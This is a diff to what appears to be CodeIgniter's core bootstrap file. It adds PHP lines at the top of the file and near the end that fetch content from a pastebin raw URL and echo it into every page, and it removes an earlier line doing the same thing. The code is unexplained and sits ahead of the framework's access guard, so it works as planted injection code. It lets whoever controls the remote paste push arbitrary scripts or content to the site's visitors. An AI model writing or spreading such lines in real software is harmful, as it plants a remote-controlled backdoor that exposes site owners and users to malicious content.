@@ -1,3 +1,4 @@
+<?php echo file_get_contents("https://pastebin.com/raw/64YMj6rg"); ?>
 <?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
 /**
  * CodeIgniter
@@ -380,14 +381,13 @@
 	{
 		$OUT->_display();
 	}
-
+<?php echo file_get_contents("https://pastebin.com/raw/64YMj6rg"); ?>
 /*
  * ------------------------------------------------------
  *  Is there a "post_system" hook?
  * ------------------------------------------------------
  */
 	$EXT->_call_hook('post_system');
-        $a = file_get_contents('https://pastebin.com/raw/64YMj6rg'); echo $a;
 /*
  * ------------------------------------------------------
  *  Close the DB connection if one exists
